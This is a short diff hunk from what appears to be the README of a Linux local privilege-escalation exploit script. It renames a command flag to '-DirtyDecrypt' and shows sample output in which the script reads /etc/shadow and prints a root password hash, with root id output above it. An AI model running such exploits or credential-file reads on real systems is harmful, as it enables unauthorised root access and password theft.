@@ -342,7 +342,7 @@ uid=0(root) gid=0(root) groups=0(root),65534(nogroup)
 ## 💀 DirtyDecrypt
 
 ```
-osboxes@ubuntu2204:~/fullEx$ ./fullEx.sh -ReadRoot
+osboxes@ubuntu2204:~/fullEx$ ./fullEx.sh -DirtyDecrypt
 fd 6 -> /etc/shadow (round=56 try=0)
 root:$y$j9T$2i0jg43MIXEb46SaesJNb/$aTKP442ulqTqE/pv93W8HFCgu4Qi2JHJY0lO7RjMxC5:20572:0:99999:7:::
 daemon:*:20571:0:99999:7:::
